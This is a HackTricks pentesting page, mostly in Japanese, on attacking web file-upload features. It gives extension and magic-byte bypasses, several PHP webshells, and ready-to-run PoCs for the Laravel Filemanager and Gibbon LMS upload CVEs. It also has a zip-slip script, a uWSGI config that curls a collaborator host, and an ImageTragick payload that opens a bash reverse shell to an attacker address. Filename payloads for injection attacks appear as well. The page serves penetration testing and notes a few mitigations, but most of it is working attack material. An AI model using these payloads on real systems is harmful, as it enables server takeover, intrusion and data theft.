# ファイルアップロード

{{#include ../../banners/hacktricks-training.md}}

## ファイルアップロード一般的手法

その他の有用な拡張子:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### ファイル拡張子チェックのバイパス

1. 可能なら、前述の**拡張子**を**チェック**してください。また、大文字を使ってテストすることも有効です: _pHp, .pHP5, .PhAr ..._
2. _実行可能拡張子の前に有効な拡張子を**追加する**ことを確認してください（前述の拡張子も使用）:_
- _file.png.php_
- _file.png.Php5_
3. 末尾に**特殊文字を追加**してみてください。Burp を使って全ての **ascii** と **Unicode** 文字を **bruteforce** することができます。(_前述の**拡張子**を使って試すこともできます_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. サーバー側の拡張子パーサーを**騙す**ことで保護を回避する（拡張子を二重にする、拡張子の間に**null**バイトなどのゴミデータを入れるなど）。_より良いペイロードを作るために、前述の拡張子も利用できます。_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 前述のチェックに**さらに拡張子の層を追加**する:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **実行拡張子を有効な拡張子の前に置く**ことを試して、サーバーが誤設定されていることに賭ける。（Apache の誤設定を突くのに有効。拡張子が**.php**を含む任意のファイルが実行されるが、必ずしも .php で終わる必要はない場合など）
- _ex: file.php.png_
7. **Windows の NTFS alternate data stream (ADS)** を使用する。禁止された拡張子の後、許可された拡張子の前にコロン ":" を挿入します。その結果、サーバー上に**禁止拡張子の空ファイル**が作成されることがあります（例: "file.asax:.jpg"）。このファイルは後で短いファイル名を使うなどの別の手法で編集できる可能性があります。 "**::$data**" パターンを使うと非空ファイルを作成することもできます。したがって、このパターンの後にドットを追加することは、さらなる制限を回避するのに有用な場合があります（例: "file.asp::$data."）
8. ファイル名長の制限を破ろうとする。正規の拡張子が切り捨てられ、悪意ある PHP が残る。AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

一部の upload handler は保存されるファイル名から末尾のドット文字をトリムまたは正規化します。UniSharp の Laravel Filemanager (unisharp/laravel-filemanager) の 2.9.1 より前のバージョンでは、次の手順で拡張子検証をバイパスできます:

- PNG の `\x89PNG\r\n\x1a\n` のような有効な画像 MIME と magic header を使用する。
- アップロードするファイル名を `shell.php.` のように、PHP 拡張子の後にドットを付けて命名する。
- サーバーが末尾のドットを取り除いて `shell.php` を永続化し、それが web 配信ディレクトリ（デフォルトの public storage 例: /storage/files/）に置かれていれば実行されます。

最小限の PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
次に、保存されたパスにアクセスします（Laravel + LFMで一般的）:
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- unisharp/laravel-filemanager を ≥ 2.9.1 にアップグレードする。
- サーバー側で厳格な allowlists を適用し、保存されたファイル名を再検証する。
- アップロードを実行可能ではない場所から配信する。

### Bypass Content-Type, Magic Number, Compression & Resizing

- Content-Type のチェックは、**Content-Type** ヘッダの**値**を次のように設定してバイパスできる: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** チェックは、ファイルの先頭に実際の画像のバイト列を追加して（`file` コマンドを混乱させる）、あるいはメタデータ内にシェルを仕込むことでバイパスできる:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` またはペイロードを画像に直接埋め込むこともできる:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- もし画像に圧縮がかけられている場合（例えば PHP-GD のような標準的な PHP ライブラリを使用している場合）、前述の手法は有効でないことがある。しかし、**PLTE chunk** の [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) を使えば、圧縮を**生き延びる**テキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Webページが画像を**リサイズ**している場合（例えば PHP-GD の `imagecopyresized` や `imagecopyresampled` を使っている場合）、同様に対処が必要だが、**IDAT chunk** の [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) を用いれば圧縮を**生き延びる**テキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- 画像のリサイズ（PHP-GD の `thumbnailImage` など）を生き延びるペイロードを作る別の手法として、**tEXt chunk** の [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) を使って圧縮を**生き延びる**テキストを挿入する方法がある。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- 既にアップロードされたファイルの拡張子を変更するためにファイルを**rename**できる脆弱性を探す。
- バックドアを実行するための **Local File Inclusion** の脆弱性を探す。
- **Possible Information disclosure**:
1. 同じ名前の同一ファイルを**複数回**（かつ**同時に**）アップロードする。
2. 既に存在するファイルやフォルダと同じ**名前**のファイルをアップロードする。
3. ファイル名を **"." , "..", or "…"** にしてアップロードする。例えば、Windows 上の Apache でアプリがアップロードファイルを "/www/uploads/" ディレクトリに保存する場合、"." というファイル名は "/www/" ディレクトリに uploads” というファイルを作成してしまうことがある。
4. **NTFS** 上で **"…:.jpg"** のように削除しにくいファイルをアップロードする。（Windows）
5. Windows でファイル名に `|<>*?”` のような **無効な文字** を含むファイルをアップロードする。（Windows）
6. Windows で CON, PRN, AUX, NUL, COM1 ～ COM9, LPT1 ～ LPT9 のような **予約（禁止）名** を使ってファイルをアップロードする。
- 被害者が誤って開いたときにコードを実行するような、.exe のような**実行ファイル**や、比較的怪しまれない **.html** をアップロードしてみる。

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` ファイルは Java の `.jar` に似たもので、php 用のアーカイブだが、php として実行したりスクリプト内に include することで **php ファイルのように扱える**。
`.inc` 拡張子はインポート用の php ファイルに使われることがあり、場合によってはこの拡張子が実行可能として許可されていることがある。

## **Jetty RCE**

Jetty サーバーに XML ファイルをアップロードできると、[RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** を得られる可能性がある。したがって、次の画像にあるように XML ファイルを `$JETTY_BASE/webapps/` にアップロードするとシェルが期待できる。

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

uWSGI サーバーでは、`.ini` 設定ファイルを改変できる能力があれば Remote Command Execution (RCE) 脆弱性を悪用できる可能性がある。uWSGI の設定ファイルは特定の構文で「magic」な変数、プレースホルダ、オペレータを取り扱う。特に `@(filename)` として使われる '@' オペレータはファイルの内容をインクルードするために設計されている。uWSGI がサポートする様々なスキームの中で、"exec" スキームはプロセスの標準出力からデータを読み取ることができるため特に強力であり、`.ini` 設定ファイルが処理される際にこの機能を悪用すると Remote Command Execution や Arbitrary File Write/Read を引き起こす可能性がある。

以下は、さまざまなスキームを示す悪意のある `uwsgi.ini` ファイルの例を考えてみてほしい。
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
ペイロードの実行は設定ファイルのパース時に発生します。設定を有効化してパースさせるには、uWSGI プロセスを再起動するか（クラッシュ後や Denial of Service 攻撃による場合も含む）、ファイルを auto-reload に設定する必要があります。auto-reload 機能が有効な場合、変更を検知すると指定間隔でファイルを再読み込みします。

uWSGI の設定ファイルのパースが緩い点を理解することが重要です。具体的には、ここで説明した payload はバイナリファイル（image や PDF など）の中に埋め込むことも可能で、悪用の範囲をさらに広げます。

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

認証前のエンドポイントが web root 内に任意のファイル書き込みを許し、PHP ファイルを配置することで pre-auth RCE に繋がります。脆弱バージョン: 25.0.01 まで（含む）。

- エンドポイント: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- メソッド: POST
- 必要なパラメータ:
- `img`: data-URI のような文字列: `[mime];[name],[base64]`（サーバは type/name を無視し、末尾を base64 デコードします）
- `path`: Gibbon インストールディレクトリからの相対的な出力先ファイル名（例: `poc.php` や `0xdf.php`）
- `gibbonPersonID`: 空でない任意の値を受け付けます（例: `0000000001`）

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
最小限のwebshellを配置してコマンドを実行する:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
注意:
- ハンドラは `;` と `,` で分割した後に `base64_decode($_POST["img"])` を実行し、拡張子/タイプを検証せずにバイトを `$absolutePath . '/' . $_POST['path']` に書き込みます。
- 結果として生成されるコードは web サービスのユーザとして実行されます（例: XAMPP Apache on Windows）。

このバグに関する参照には usd HeroLab advisory と NVD のエントリが含まれます。下の References セクションを参照してください。

## **wget File Upload/SSRF Trick**

場合によっては、サーバが **`wget`** を使って **download files** を行い、あなたが **URL** を **indicate** できることがあります。こうした場合、コードはダウンロードされるファイルの拡張子が whitelist に含まれているかをチェックして、許可されたファイルのみがダウンロードされるようにしていることがあります。しかし、**このチェックは回避可能です。**\
**linux** における **filename** の **maximum** 長さは **255** ですが、**wget** はファイル名を **236** 文字に切り詰めます。  
You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### NTFS junctions (Windows) を使ったアップロードディレクトリの脱出

（この攻撃では対象のWindowsマシンへのローカルアクセスが必要です）Windowsでアップロードがユーザーごとのサブフォルダ（例: C:\Windows\Tasks\Uploads\<id>\）に保存され、あなたがそのサブフォルダの作成/削除を制御できる場合、そのサブフォルダをdirectory junctionで機微な場所（例: webroot）を指すものに置き換えることができます。以降のアップロードはターゲットパスに書き込まれ、もしターゲットがserver-side codeを解釈する場合はコード実行を可能にします。

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
注意
- mklink /J creates an NTFS directory junction (reparse point). The web server’s account must follow the junction and have write permission in the destination.
- This redirects arbitrary file writes; if the destination executes scripts (PHP/ASP), this becomes RCE.
- 防御: 攻撃者が制御可能な場所（例: C:\Windows\Tasks 等）に書き込み可能なアップロードルートを置かない; junction の作成をブロックする; サーバー側で拡張子を検証する; アップロードを別ボリュームに保存するか deny‑execute ACLs を設定する。

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

一部のレガシーなアップロードハンドラは `snprintf()` 等を使って単一ファイルのアップロードからマルチファイル配列を構築することがありますが、`snprintf()` の不整合や切り捨て挙動を突くと `_FILES` 構造を偽装できる場合があります。巧妙に作られた単一のアップロードがサーバ側で複数のインデックス化されたファイルとして見え、厳密な形状を仮定するロジック（例: マルチファイルアップロードとして扱い、安全でない分岐を取る）を混乱させます。今日ではニッチですが、この “index corruption” パターンは時折 CTF や古いコードベースで再発します。

## From File upload to other vulnerabilities

- **filename** を `../../../tmp/lol.png` に設定し、**path traversal** を試みる
- **filename** を `sleep(10)-- -.jpg` に設定すると **SQL injection** が実現できるかもしれない
- **filename** を `<svg onload=alert(document.domain)>` にすると XSS を引き起こせる
- **filename** を `; sleep 10;` にしてコマンドインジェクションをテストする（詳細は [command injections tricks here](../command-injection.md)）
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- ファイルアップロード時に **size limit** があるか確認する

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

その他のファイルタイプについては [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) を参照してください。

## Zip/Tar File Automatically decompressed Upload

サーバ内で展開される ZIP をアップロードできる場合、2つのことができます:

### Symlink

他のファイルへのソフトリンク（シンボリックリンク）を含むアーカイブをアップロードすると、解凍後に展開されたファイルへアクセスすることでリンク先のファイルにアクセスできます:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

Decompression 中にディレクトリへ予期せずファイルが作成される問題は重大です。当初、この構成が malicious file uploads による OS-level command execution を防ぐと考えられることがありますが、ZIP archive format の hierarchical compression support と directory traversal 機能が悪用される可能性があります。これにより攻撃者は制限を回避し、ターゲットアプリケーションの decompression functionality を操作して安全な upload directories から脱出できます。

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). The utility can be used as shown:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
さらに、**symlink trick with evilarc** は選択肢の一つです。目的が `/flag.txt` のようなファイルをターゲットにすることであれば、そのファイルへの symlink をシステム上に作成してください。これにより evilarc が動作中にエラーを起こさないようにできます。

以下は、悪意のある zip ファイルを作成するための Python コードの例です:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**圧縮を悪用した file spraying**

詳細は **元の投稿を確認してください**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHPコードが `$_REQUEST` で渡されたコマンドを実行するように書かれています。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 複数のファイルを作成し、それらを含むzipアーカイブを作成します。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip内のファイル名をviまたはhex editorで変更し、"xxA" を "../" に置換してディレクトリを横断します。

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

このコンテンツを画像拡張子でアップロードすることで脆弱性 **(ImageMagick , 7.0.1-1)** を悪用できます（詳細は [exploit](https://www.exploit-db.com/exploits/39767) を参照）
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PHP ShellをPNGに埋め込む

PNGファイルのIDATチャンクにPHP shellを埋め込むことで、特定の画像処理を効果的にバイパスできます。PHP-GDの`imagecopyresized`や`imagecopyresampled`といった関数は、画像のリサイズやリサンプリングで一般的に使用されるため、この文脈で特に関連性があります。埋め込まれたPHP shellがこれらの操作によって影響を受けずに残る能力は、特定のユースケースで大きな利点となります。

この手法の方法論や応用例を詳述した記事はこちらにあります: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)。このリソースはプロセスとその影響について包括的に解説しています。

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot filesは、複数のファイル形式として同時に有効に存在できるカメレオンのようなツールです。興味深い例として[GIFAR](https://en.wikipedia.org/wiki/Gifar)があり、これはGIFとRARアーカイブの両方として機能するハイブリッドです。こうしたファイルはこの組み合わせに限らず、GIFとJSやPPTとJSのような組み合わせも可能です。

polyglotファイルの主な有用性は、ファイルタイプでスクリーニングするセキュリティ対策を回避できる点にあります。多くのアプリケーションでは、潜在的に危険なフォーマット（例: JS、PHP、Phar）によるリスクを軽減するために、JPEG、GIF、DOCなど特定のファイルタイプのみをアップロード許可することが一般的です。しかし、polyglotは複数のファイルタイプの構造的条件を満たすことで、これらの制限をこっそり回避することができます。

ただし、polyglotにも制約はあります。たとえば、polyglotが同時にPHARファイル（PHp ARchive）とJPEGの両方を内包していても、プラットフォームのファイル拡張子ポリシーによってはアップロードの成功が左右される可能性があります。システムが許可される拡張子に厳格であれば、構造的な二重性だけではアップロードを保証できないことがあります。

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDFのように見せかけて有効なJSONをアップロードする

許可されていない場合でもPDFを偽装して有効なJSONファイルをアップロードすることでファイルタイプ検出を回避する方法（**[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** の手法）:

- **`mmmagic` library**: 最初の1024バイトに`%PDF`のmagicバイトが含まれていれば有効と見なされます（記事の例参照）
- **`pdflib` library**: JSONのフィールド内に偽のPDFフォーマットを追加して、ライブラリにPDFだと誤認させる（記事の例参照）
- **`file` binary**: ファイルから最大1048576バイトまで読み取れます。これより大きなJSONを作成し、JSONとして解析できないようにしてから、そのJSON内に本物のPDFの先頭部分を入れると、PDFだと判断されます

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
